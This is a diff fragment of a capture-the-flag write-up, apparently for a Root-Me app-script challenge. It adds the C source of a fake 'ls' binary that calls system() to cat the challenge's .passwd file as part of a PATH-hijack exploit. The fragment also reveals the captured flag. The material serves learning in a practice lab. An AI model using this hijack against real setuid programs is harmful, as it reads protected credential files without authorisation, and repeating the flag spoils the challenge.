@@ -71,6 +71,16 @@ app-script-ch12@challenge02:/tmp/pwnd1$ mv pwn ls
 app-script-ch12@challenge02:/tmp/pwnd1$ ~/ch12 
 8a95eDS/*e_T#
 ```
+Pwn.c code :
+```C
+#include <stdlib.h>
+#include <stdio.h>
+
+int main(int argc, char  *argv[]){
+       system("cat /challenge/app-script/ch12/.passwd");
+       return 0;
+}
+```
 Flag is : ```8a95eDS/*e_T#```
 
 # Perl - Command injection
